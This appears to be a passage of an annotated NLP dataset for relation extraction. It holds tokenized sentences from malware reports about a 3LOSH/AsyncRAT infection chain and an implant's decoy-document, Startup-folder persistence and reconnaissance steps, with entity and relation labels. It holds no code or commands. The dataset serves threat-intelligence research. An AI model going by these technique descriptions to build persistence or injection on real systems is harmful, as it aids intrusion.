[27, 27], "name": "PowerShell", "pos": [12, 13], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [30, 30], "name": "'Microsofd.ps1'PowerShell", "pos": [15, 16], "index": "3_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [35, 35], "name": "script", "pos": [2, 3], "index": "4_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [46, 46], "name": "script", "pos": [1, 2], "index": "5_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [50, 50], "name": "GZIP blobs", "pos": [5, 7], "index": "6_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [65, 65], "name": "aspnet_compiler.exe", "pos": [5, 6], "index": "7_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [70, 70], "name": "payload", "pos": [10, 11], "index": "8_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [74, 74], "name": "it", "pos": [14, 15], "index": "9_0"}]], "labels": [{"r": "EX", "evidence": [0], "h": 0, "t": 1}, {"r": "FR", "evidence": [0, 1], "h": 0, "t": 2}, {"r": "EX", "evidence": [1], "h": 2, "t": 3}, {"r": "CO", "evidence": [1, 2], "h": 3, "t": 4}, {"r": "CO", "evidence": [1, 2, 3], "h": 3, "t": 6}, {"r": "CO", "evidence": [1, 2, 3], "h": 3, "t": 5}, {"r": "CO", "evidence": [1, 2, 3, 4], "h": 3, "t": 9}, {"r": "UK", "evidence": [3, 4], "t": 5, "h": 8}, {"r": "IJ", "evidence": [4], "t": 7, "h": 8}]}, {"title": "068-19", "sents": [["This", "next", "batch", "file", "only", "contains", "a", "single", "line", ",", "which", "invokes", "PowerShell", "and", "executes", "'Microsofd.ps1'PowerShell", "execution", "."], ["This", "PowerShell", "script", "is", "the", "final", "script", "executed", "in", "this", "chain", "."], ["This", "script", "contains", "two", "large", "GZIP", "blobs", "and", "another", "function", "responsible", "for", "decompressing", "them", "."], ["This", "is", "accomplished", "by", "invoking", "aspnet_compiler.exe", ",", "injecting", "the", "final", "payload", ",", "and", "executing", "it", "."], ["The", "infection", "chain", "is", "more", "complicated", ",", "featuring", "the", "use", "of", "multiple", "script-based", "components", "(", "BAT", ",", "VBS", ",", "PS1", ")", "that", "facilitate", "the", "infection", "process", "."], ["Additionally", ",", "while", "analyzing", "our", "original", "sample", "cluster", "and", "new", "samples", "created", "using", "the", "3LOSH", "crypter", ",", "we", "identified", "several", "final", "payloads", "in", "both", "clusters", "that", "use", "the", "same", "infrastructure", "for", "post-compromise", "C2", "communications", "."], ["Matching", "RAT", "configs", "in", "both", "sample", "clusters", "."], ["While", "analyzing", "one", "of", "the", "AsyncRAT", "payloads", "in", "our", "original", "sample", "cluster", ",", "we", "also", "observed", "that", "the", "Group_ID", "in", "the", "embedded", "RAT", "configuration", "was", "set", "to", "``", "3LOSH", "."]], "vertexSet": [[{"type": "TP", "sent_id": 0, "global_pos": [12, 12], "name": "PowerShell", "pos": [12, 13], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [15, 15], "name": "'Microsofd.ps1'PowerShell", "pos": [15, 16], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [20, 20], "name": "script", "pos": [2, 3], "index": "2_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [31, 31], "name": "script", "pos": [1, 2], "index": "3_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [35, 35], "name": "GZIP blobs", "pos": [5, 7], "index": "4_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [50, 50], "name": "aspnet_compiler.exe", "pos": [5, 6], "index": "5_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [55, 55], "name": "payload", "pos": [10, 11], "index": "6_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [59, 59], "name": "it", "pos": [14, 15], "index": "7_0"}]], "labels": [{"r": "EX", "evidence": [0], "h": 0, "t": 1}, {"r": "CO", "evidence": [0, 1], "h": 1, "t": 2}, {"r": "CO", "evidence": [0, 1, 2], "h": 1, "t": 4}, {"r": "CO", "evidence": [0, 1, 2], "h": 1, "t": 3}, {"r": "CO", "evidence": [0, 1, 2, 3], "h": 1, "t": 7}, {"r": "UK", "evidence": [2, 3], "t": 3, "h": 6}, {"r": "IJ", "evidence": [3], "t": 5, "h": 6}]}, {"title": "068-20", "sents": [["This", "PowerShell", "script", "is", "the", "final", "script", "executed", "in", "this", "chain", "."], ["This", "script", "contains", "two", "large", "GZIP", "blobs", "and", "another", "function", "responsible", "for", "decompressing", "them", "."], ["This", "is", "accomplished", "by", "invoking", "aspnet_compiler.exe", ",", "injecting", "the", "final", "payload", ",", "and", "executing", "it", "."], ["The", "infection", "chain", "is", "more", "complicated", ",", "featuring", "the", "use", "of", "multiple", "script-based", "components", "(", "BAT", ",", "VBS", ",", "PS1", ")", "that", "facilitate", "the", "infection", "process", "."], ["Additionally", ",", "while", "analyzing", "our", "original", "sample", "cluster", "and", "new", "samples", "created", "using", "the", "3LOSH", "crypter", ",", "we", "identified", "several", "final", "payloads", "in", "both", "clusters", "that", "use", "the", "same", "infrastructure", "for", "post-compromise", "C2", "communications", "."], ["Matching", "RAT", "configs", "in", "both", "sample", "clusters", "."], ["While", "analyzing", "one", "of", "the", "AsyncRAT", "payloads", "in", "our", "original", "sample", "cluster", ",", "we", "also", "observed", "that", "the", "Group_ID", "in", "the", "embedded", "RAT", "configuration", "was", "set", "to", "``", "3LOSH", "."], ["Orbital", "QueriesCisco", "Secure", "Endpoint", "users", "can", "use", "Orbital", "Advanced", "Search", "to", "run", "complex", "OSqueries", "to", "see", "if", "their", "endpoints", "are", "infected", "with", "this", "specific", "threat", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [2, 2], "name": "script", "pos": [2, 3], "index": "0_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [13, 13], "name": "script", "pos": [1, 2], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [17, 17], "name": "GZIP blobs", "pos": [5, 7], "index": "2_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [32, 32], "name": "aspnet_compiler.exe", "pos": [5, 6], "index": "3_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [37, 37], "name": "payload", "pos": [10, 11], "index": "4_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [41, 41], "name": "it", "pos": [14, 15], "index": "5_0"}]], "labels": [{"r": "UK", "evidence": [1, 2], "t": 1, "h": 4}, {"r": "IJ", "evidence": [2], "t": 3, "h": 4}]}, {"title": "031-0", "sents": [["It", "is", "highly", "likely", "that", "the", "threat", "actor", "has", "continued", "to", "use", "the", "email", "vector", "to", "deliver", "their", "lures", "and", "implants", "."], ["All", "the", "malicious", "functionalities", "are", "implemented", "through", "the", "timers", "configured", "in", "the", "implant", "."], ["DEPLOYING", "THE", "DECOY", "DOCUMENT"], ["One", "of", "these", "timers", "is", "responsible", "for", "extracting", "the", "decoy", "document", "and", "saving", "it", "to", "the", "%", "TEMP", "%", "folder", "and", "then", "displaying", "it", "via", "ShellExecute", ":"], ["Decoy", "document", "extracted", "and", "displayed", "to", "the", "target", "."], ["Now", ",", "if", "the", "implant", "is", "started", "with", "the", "``", "-start", "''", "command-line", "switch", ",", "it", "will", "skip", "the", "process", "for", "dropping", "and", "displaying", "the", "decoy", "document", "and", "jump", "straight", "to", "its", "RAT", "functionalities", "."], ["Another", "timer", "is", "used", "to", "establish", "persistence", "for", "the", "implant", "on", "the", "endpoint", "."], ["Here", ",", "the", "implant", "will", "establish", "persistence", "by", "obtaining", "its", "current", "command", "line", ",", "which", "is", "then", "used", "to", "create", "a", "shortcut", "for", "itself", "in", "the", "%", "TEMP", "%", "directory", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [7, 7], "name": "actor", "pos": [7, 8], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [13, 13], "name": "email vector", "pos": [13, 15], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [34, 34], "name": "implant", "pos": [12, 13], "index": "2_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [43, 43], "name": "timers", "pos": [3, 4], "index": "3_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [49, 49], "name": "decoy document", "pos": [9, 11], "index": "4_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [65, 65], "name": "ShellExecute", "pos": [25, 26], "index": "5_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [80, 80], "name": "implant", "pos": [4, 5], "index": "6_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [111, 111], "name": "Another timer", "pos": [0, 2], "index": "7_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [120, 120], "name": "implant", "pos": [9, 10], "index": "8_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [128, 128], "name": "implant", "pos": [3, 4], "index": "9_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [146, 146], "name": "shortcut", "pos": [21, 22], "index": "10_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [0, 1], "h": 0, "t": 2}, {"r": "WR", "evidence": [0, 1, 2, 3], "h": 0, "t": 4}, {"r": "WR", "evidence": [1, 2, 3], "t": 2, "h": 3}, {"r": "FR", "evidence": [3], "h": 3, "t": 5}, {"r": "RD", "evidence": [3], "t": 4, "h": 5}, {"r": "RD", "evidence": [3, 4, 5], "h": 5, "t": 6}, {"r": "WR", "evidence": [3, 4, 5], "h": 5, "t": 6}, {"r": "EX", "evidence": [3, 4, 5], "h": 5, "t": 6}, {"r": "WR", "evidence": [5, 6], "t": 6, "h": 7}, {"r": "WR", "evidence": [6], "h": 7, "t": 8}, {"r": "EX", "evidence": [6, 7], "h": 7, "t": 9}, {"r": "WR", "evidence": [6, 7], "h": 7, "t": 10}, {"r": "CO", "evidence": [6, 7], "h": 8, "t": 9}]}, {"title": "031-1", "sents": [["All", "the", "malicious", "functionalities", "are", "implemented", "through", "the", "timers", "configured", "in", "the", "implant", "."], ["DEPLOYING", "THE", "DECOY", "DOCUMENT"], ["One", "of", "these", "timers", "is", "responsible", "for", "extracting", "the", "decoy", "document", "and", "saving", "it", "to", "the", "%", "TEMP", "%", "folder", "and", "then", "displaying", "it", "via", "ShellExecute", ":"], ["Decoy", "document", "extracted", "and", "displayed", "to", "the", "target", "."], ["Now", ",", "if", "the", "implant", "is", "started", "with", "the", "``", "-start", "''", "command-line", "switch", ",", "it", "will", "skip", "the", "process", "for", "dropping", "and", "displaying", "the", "decoy", "document", "and", "jump", "straight", "to", "its", "RAT", "functionalities", "."], ["Another", "timer", "is", "used", "to", "establish", "persistence", "for", "the", "implant", "on", "the", "endpoint", "."], ["Here", ",", "the", "implant", "will", "establish", "persistence", "by", "obtaining", "its", "current", "command", "line", ",", "which", "is", "then", "used", "to", "create", "a", "shortcut", "for", "itself", "in", "the", "%", "TEMP", "%", "directory", "."], ["The", "shortcut", "to", "run", "the", "implant", "contains", "the", "``", "-start", "''", "switch", "(", "used", "to", "skip", "the", "displaying", "of", "the", "decoy", "document", ")", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [12, 12], "name": "implant", "pos": [12, 13], "index": "0_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [21, 21], "name": "timers", "pos": [3, 4], "index": "1_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [27, 27], "name": "decoy document", "pos": [9, 11], "index": "2_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [43, 43], "name": "ShellExecute", "pos": [25, 26], "index": "3_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [58, 58], "name": "implant", "pos": [4, 5], "index": "4_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [89, 89], "name": "Another timer", "pos": [0, 2], "index": "5_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [98, 98], "name": "implant", "pos": [9, 10], "index": "6_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [106, 106], "name": "implant", "pos": [3, 4], "index": "7_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [124, 124], "name": "shortcut", "pos": [21, 22], "index": "8_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [139, 139], "name": "implant", "pos": [5, 6], "index": "9_0"}]], "labels": [{"r": "WR", "evidence": [0, 1, 2], "t": 0, "h": 1}, {"r": "FR", "evidence": [2], "h": 1, "t": 3}, {"r": "RD", "evidence": [2], "t": 2, "h": 3}, {"r": "RD", "evidence": [2, 3, 4], "h": 3, "t": 4}, {"r": "WR", "evidence": [2, 3, 4], "h": 3, "t": 4}, {"r": "EX", "evidence": [2, 3, 4], "h": 3, "t": 4}, {"r": "WR", "evidence": [4, 5], "t": 4, "h": 5}, {"r": "WR", "evidence": [5], "h": 5, "t": 6}, {"r": "EX", "evidence": [5, 6], "h": 5, "t": 7}, {"r": "WR", "evidence": [5, 6], "h": 5, "t": 8}, {"r": "CO", "evidence": [5, 6], "h": 6, "t": 7}, {"r": "CO", "evidence": [6, 7], "h": 7, "t": 9}]}, {"title": "031-2", "sents": [["DEPLOYING", "THE", "DECOY", "DOCUMENT"], ["One", "of", "these", "timers", "is", "responsible", "for", "extracting", "the", "decoy", "document", "and", "saving", "it", "to", "the", "%", "TEMP", "%", "folder", "and", "then", "displaying", "it", "via", "ShellExecute", ":"], ["Decoy", "document", "extracted", "and", "displayed", "to", "the", "target", "."], ["Now", ",", "if", "the", "implant", "is", "started", "with", "the", "``", "-start", "''", "command-line", "switch", ",", "it", "will", "skip", "the", "process", "for", "dropping", "and", "displaying", "the", "decoy", "document", "and", "jump", "straight", "to", "its", "RAT", "functionalities", "."], ["Another", "timer", "is", "used", "to", "establish", "persistence", "for", "the", "implant", "on", "the", "endpoint", "."], ["Here", ",", "the", "implant", "will", "establish", "persistence", "by", "obtaining", "its", "current", "command", "line", ",", "which", "is", "then", "used", "to", "create", "a", "shortcut", "for", "itself", "in", "the", "%", "TEMP", "%", "directory", "."], ["The", "shortcut", "to", "run", "the", "implant", "contains", "the", "``", "-start", "''", "switch", "(", "used", "to", "skip", "the", "displaying", "of", "the", "decoy", "document", ")", "."], ["This", "shortcut", "is", "then", "moved", "over", "to", "the", "currently", "logged-in", "user", "'s", "Startup", "folder", "to", "complete", "persistence", "across", "reboots", "and", "re-logins", "."]], "vertexSet": [[{"type": "MP", "sent_id": 1, "global_pos": [7, 7], "name": "timers", "pos": [3, 4], "index": "0_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [13, 13], "name": "decoy document", "pos": [9, 11], "index": "1_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [29, 29], "name": "ShellExecute", "pos": [25, 26], "index": "2_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [44, 44], "name": "implant", "pos": [4, 5], "index": "3_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [75, 75], "name": "Another timer", "pos": [0, 2], "index": "4_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [84, 84], "name": "implant", "pos": [9, 10], "index": "5_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [92, 92], "name": "implant", "pos": [3, 4], "index": "6_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [110, 110], "name": "shortcut", "pos": [21, 22], "index": "7_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [125, 125], "name": "implant", "pos": [5, 6], "index": "8_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [153, 153], "name": "logged-in user 's Startup folder", "pos": [9, 14], "index": "9_0"}]], "labels": [{"r": "FR", "evidence": [1], "h": 0, "t": 2}, {"r": "RD", "evidence": [1], "t": 1, "h": 2}, {"r": "RD", "evidence": [1, 2, 3], "h": 2, "t": 3}, {"r": "WR", "evidence": [1, 2, 3], "h": 2, "t": 3}, {"r": "EX", "evidence": [1, 2, 3], "h": 2, "t": 3}, {"r": "WR", "evidence": [3, 4], "t": 3, "h": 4}, {"r": "WR", "evidence": [4], "h": 4, "t": 5}, {"r": "EX", "evidence": [4, 5], "h": 4, "t": 6}, {"r": "RD", "evidence": [4, 5, 6, 7], "h": 4, "t": 9}, {"r": "WR", "evidence": [4, 5], "h": 4, "t": 7}, {"r": "WR", "evidence": [4, 5, 6, 7], "h": 4, "t": 9}, {"r": "CO", "evidence": [4, 5], "h": 5, "t": 6}, {"r": "CO", "evidence": [5, 6], "h": 6, "t": 8}]}, {"title": "031-3", "sents": [["One", "of", "these", "timers", "is", "responsible", "for", "extracting", "the", "decoy", "document", "and", "saving", "it", "to", "the", "%", "TEMP", "%", "folder", "and", "then", "displaying", "it", "via", "ShellExecute", ":"], ["Decoy", "document", "extracted", "and", "displayed", "to", "the", "target", "."], ["Now", ",", "if", "the", "implant", "is", "started", "with", "the", "``", "-start", "''", "command-line", "switch", ",", "it", "will", "skip", "the", "process", "for", "dropping", "and", "displaying", "the", "decoy", "document", "and", "jump", "straight", "to", "its", "RAT", "functionalities", "."], ["Another", "timer", "is", "used", "to", "establish", "persistence", "for", "the", "implant", "on", "the", "endpoint", "."], ["Here", ",", "the", "implant", "will", "establish", "persistence", "by", "obtaining", "its", "current", "command", "line", ",", "which", "is", "then", "used", "to", "create", "a", "shortcut", "for", "itself", "in", "the", "%", "TEMP", "%", "directory", "."], ["The", "shortcut", "to", "run", "the", "implant", "contains", "the", "``", "-start", "''", "switch", "(", "used", "to", "skip", "the", "displaying", "of", "the", "decoy", "document", ")", "."], ["This", "shortcut", "is", "then", "moved", "over", "to", "the", "currently", "logged-in", "user", "'s", "Startup", "folder", "to", "complete", "persistence", "across", "reboots", "and", "re-logins", "."], ["The", "remaining", "two", "timers", "will", "gather", "preliminary", "system", "information", "and", "activate", "the", "RAT", "capabilities", "of", "the", "implant", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [3, 3], "name": "timers", "pos": [3, 4], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [9, 9], "name": "decoy document", "pos": [9, 11], "index": "1_0"}], [{"type": "TP", "sent_id": 0, "global_pos": [25, 25], "name": "ShellExecute", "pos": [25, 26], "index": "2_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [40, 40], "name": "implant", "pos": [4, 5], "index": "3_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [71, 71], "name": "Another timer", "pos": [0, 2], "index": "4_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [80, 80], "name": "implant", "pos": [9, 10], "index": "5_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [88, 88], "name": "implant", "pos": [3, 4], "index": "6_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [106, 106], "name": "shortcut", "pos": [21, 22], "index": "7_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [121, 121], "name": "implant", "pos": [5, 6], "index": "8_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [149, 149], "name": "logged-in user 's Startup folder", "pos": [9, 14], "index": "9_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [164, 164], "name": "two timers", "pos": [2, 4], "index": "10_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [168, 168], "name": "preliminary system information", "pos": [6, 9], "index": "11_0"}]], "labels": [{"r": "FR", "evidence": [0], "h": 0, "t": 2}, {"r": "RD", "evidence": [0], "t": 1, "h": 2}, {"r": "RD", "evidence": [0, 1, 2], "h": 2, "t": 3}, {"r": "WR", "evidence": [0, 1, 2], "h": 2, "t": 3}, {"r": "EX", "evidence": [0, 1, 2], "h": 2, "t": 3}, {"r": "WR", "evidence": [2, 3], "t": 3, "h": 4}, {"r": "WR", "evidence": [3], "h": 4, "t": 5}, {"r": "EX", "evidence": [3, 4], "h": 4, "t": 6}, {"r": "RD", "evidence": [3, 4, 5, 6], "h": 4, "t": 9}, {"r": "WR", "evidence": [3, 4], "h": 4, "t": 7}, {"r": "WR", "evidence": [3, 4, 5, 6], "h": 4, "t": 9}, {"r": "CO", "evidence": [3, 4], "h": 5, "t": 6}, {"r": "CO", "evidence": [4, 5], "h": 6, "t": 8}]}, {"title": "031-4", "sents": [["Decoy", "document", "extracted", "and", "displayed", "to", "the", "target", "."], ["Now", ",", "if", "the", "implant", "is", "started", "with", "the", "``", "-start", "''", "command-line", "switch", ",", "it", "will", "skip", "the", "process", "for", "dropping", "and", "displaying", "the", "decoy", "document", "and", "jump", "straight", "to", "its", "RAT", "functionalities", "."], ["Another", "timer", "is", "used", "to", "establish", "persistence", "for", "the", "implant", "on", "the", "endpoint", "."], ["Here", ",", "the", "implant", "will", "establish", "persistence", "by", "obtaining", "its", "current", "command", "line", ",", "which", "is", "then", "used", "to", "create", "a", "shortcut", "for", "itself", "in", "the", "%", "TEMP", "%", "directory", "."], ["The", "shortcut", "to", "run", "the", "implant", "contains", "the", "``", "-start", "''", "switch", "(", "used", "to", "skip", "the", "displaying", "of", "the", "decoy", "document", ")", "."], ["This", "shortcut", "is", "then", "moved", "over", "to", "the", "currently", "logged-in", "user", "'s", "Startup", "folder", "to", "complete", "persistence", "across", "reboots", "and", "re-logins", "."], ["The", "remaining", "two", "timers", "will", "gather", "preliminary", "system", "information", "and", "activate", "the", "RAT", "capabilities", "of", "the", "implant", "."], ["Generate", "a", "pc", "ID", "for", "the", "infected", "endpoint", "."]], "vertexSet": [[{"type": "MF", "sent_id": 1, "global_pos": [13, 13], "name": "implant", "pos": [4, 5], "index": "0_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [44, 44], "name": "Another timer", "pos": [0, 2], "index": "1_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [53, 53], "name": "implant", "pos": [9, 10], "index": "2_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [61, 61], "name": "implant", "pos": [3, 4], "index": "3_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [79, 79], "name": "shortcut", "pos": [21, 22], "index": "4_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [94, 94], "name": "implant", "pos": [5, 6], "index": "5_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [122, 122], "name": "logged-in user 's Startup folder", "pos": [9, 14], "index": "6_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [137, 137], "name": "two timers", "pos": [2, 4], "index": "7_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [141, 141], "name": "preliminary system information", "pos": [6, 9], "index": "8_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [155, 155], "name": "pc ID", "pos": [2, 4], "index": "9_0"}]], "labels": [{"r": "WR", "evidence": [1, 2], "t": 0, "h": 1}, {"r": "WR", "evidence": [2], "h": 1, "t": 2}, {"r": "EX", "evidence": [2, 3], "h": 1, "t": 3}, {"r": "RD", "evidence": [2, 3, 4, 5], "h": 1, "t": 6}, {"r": "WR", "evidence": [2, 3], "h": 1, "t": 4}, {"r": "WR", "evidence": [2, 3, 4, 5], "h": 1, "t": 6}, {"r": "CO", "evidence": [2, 3], "h": 2, "t": 3}, {"r": "CO", "evidence": [3, 4], "h": 3, "t": 5}]}, {"title": "031-5", "sents": [["Now", ",", "if", "the", "implant", "is", "started", "with", "the", "``", "-start", "''", "command-line", "switch", ",", "it", "will", "skip", "the", "process", "for", "dropping", "and", "displaying", "the", "decoy", "document", "and", "jump", "straight", "to", "its", "RAT", "functionalities", "."], ["Another", "timer", "is", "used", "to", "establish", "persistence", "for", "the", "implant", "on", "the", "endpoint", "."], ["Here", ",", "the", "implant", "will", "establish", "persistence", "by", "obtaining", "its", "current", "command", "line", ",", "which", "is", "then", "used", "to", "create", "a", "shortcut", "for", "itself", "in", "the", "%", "TEMP", "%", "directory", "."], ["The", "shortcut", "to", "run", "the", "implant", "contains", "the", "``", "-start", "''", "switch", "(", "used", "to", "skip", "the", "displaying", "of", "the", "decoy", "document", ")", "."], ["This", "shortcut", "is", "then", "moved", "over", "to", "the", "currently", "logged-in", "user", "'s", "Startup", "folder", "to", "complete", "persistence", "across", "reboots", "and", "re-logins", "."], ["The", "remaining", "two", "timers", "will", "gather", "preliminary", "system", "information", "and", "activate", "the", "RAT", "capabilities", "of", "the", "implant", "."], ["Generate", "a", "pc", "ID", "for", "the", "infected", "endpoint", "."], ["Save", "this", "value", "into", "a", "data", "file", ",", "such", "as", ":", "``", "%", "APPDATA", "%", "\\dsfjj45k.tmp", "''"]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [4, 4], "name": "implant", "pos": [4, 5], "index": "0_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [35, 35], "name": "Another timer", "pos": [0, 2], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [44, 44], "name": "implant", "pos": [9, 10], "index": "2_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [52, 52], "name": "implant", "pos": [3, 4], "index": "3_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [70, 70], "name": "shortcut", "pos": [21, 22], "index": "4_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [85, 85], "name": "implant", "pos": [5, 6], "index": "5_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [113, 113], "name": "logged-in user 's Startup folder", "pos": [9, 14], "index": "6_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [128, 128], "name": "two timers", "pos": [2, 4], "index": "7_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [132, 132], "name": "preliminary system information", "pos": [6, 9], "index": "8_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [146, 146], "name": "pc ID", "pos": [2, 4], "index": "9_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [158, 158], "name": "data file", "pos": [5, 7], "index": "10_0"}]], "labels": [{"r": "WR", "evidence": [0, 1], "t": 0, "h": 1}, {"r": "WR", "evidence": [1], "h": 1, "t": 2}, {"r": "EX", "evidence": [1, 2], "h": 1, "t": 3}, {"r": "RD", "evidence": [1, 2, 3, 4], "h": 1, "t": 6}, {"r": "WR", "evidence": [1, 2], "h": 1, "t": 4}, {"r": "WR", "evidence": [1, 2, 3, 4], "h": 1, "t": 6}, {"r": "CO", "evidence": [1, 2], "h": 2, "t": 3}, {"r": "CO", "evidence": [2, 3], "h": 3, "t": 5}, {"r": "WR", "evidence": [5, 6, 7], "h": 7, "t": 10}]}, {"title": "031-6", "sents": [["Another", "timer", "is", "used", "to", "establish", "persistence", "for", "the", "implant", "on", "the", "endpoint", "."], ["Here", ",", "the", "implant", "will", "establish", "persistence", "by", "obtaining", "its", "current", "command", "line", ",", "which", "is", "then", "used", "to", "create", "a", "shortcut", "for", "itself", "in", "the", "%", "TEMP", "%", "directory", "."], ["The", "shortcut", "to", "run", "the", "implant", "contains", "the", "``", "-start", "''", "switch", "(", "used", "to", "skip", "the", "displaying", "of", "the", "decoy", "document", ")", "."], ["This", "shortcut", "is", "then", "moved", "over", "to", "the", "currently", "logged-in", "user", "'s", "Startup", "folder", "to", "complete", "persistence", "across", "reboots", "and", "re-logins", "."], ["The", "remaining", "two", "timers", "will", "gather", "preliminary", "system", "information", "and", "activate", "the", "RAT", "capabilities", "of", "the", "implant", "."], ["Generate", "a", "pc", "ID", "for", "the", "infected", "endpoint", "."], ["Save", "this", "value", "into", "a", "data", "file", ",", "such", "as", ":", "``", "%", "APPDATA", "%", "\\dsfjj45k.tmp", "''"], ["Gather", "the", "Computername", "and", "username", "from", "ENV", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [0, 0], "name": "Another timer", "pos": [0, 2], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [9, 9], "name": "implant", "pos": [9, 10], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [17, 17], "name": "implant", "pos": [3, 4], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [35, 35], "name": "shortcut", "pos": [21, 22], "index": "3_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [50, 50], "name": "implant", "pos": [5, 6], "index": "4_0"}], [{"type": "SF", "sent_id": 3, "global_pos": [78, 78], "name": "logged-in user 's Startup folder", "pos": [9, 14], "index": "5_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [93, 93], "name": "two timers", "pos": [2, 4], "index": "6_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [97, 97], "name": "preliminary system information", "pos": [6, 9], "index": "7_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [111, 111], "name": "pc ID", "pos": [2, 4], "index": "8_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [123, 123], "name": "data file", "pos": [5, 7], "index": "9_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [137, 137], "name": "Computername and username", "pos": [2, 5], "index": "10_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "EX", "evidence": [0, 1], "h": 0, "t": 2}, {"r": "RD", "evidence": [0, 1, 2, 3], "h": 0, "t": 5}, {"r": "WR", "evidence": [0, 1], "h": 0, "t": 3}, {"r": "WR", "evidence": [0, 1, 2, 3], "h": 0, "t": 5}, {"r": "CO", "evidence": [0, 1], "h": 1, "t": 2}, {"r": "CO", "evidence": [1, 2], "h": 2, "t": 4}, {"r": "WR", "evidence": [4, 5, 6], "h": 6, "t": 9}, {"r": "RD", "evidence": [4, 5, 6, 7], "h": 6, "t": 10}]}, {"title": "031-7", "sents": [["Here", ",", "the", "implant", "will", "establish", "persistence", "by", "obtaining", "its", "current", "command", "line", ",", "which", "is", "then", "used", "to", "create", "a", "shortcut", "for", "itself", "in", "the", "%", "TEMP", "%", "directory", "."], ["The", "shortcut", "to", "run", "the", "implant", "contains", "the", "``", "-start", "''", "switch", "(", "used", "to", "skip", "the", "displaying", "of", "the", "decoy", "document", ")", "."], ["This", "shortcut", "is", "then", "moved", "over", "to", "the", "currently", "logged-in", "user", "'s", "Startup", "folder", "to", "complete", "persistence", "across", "reboots", "and", "re-logins", "."], ["The", "remaining", 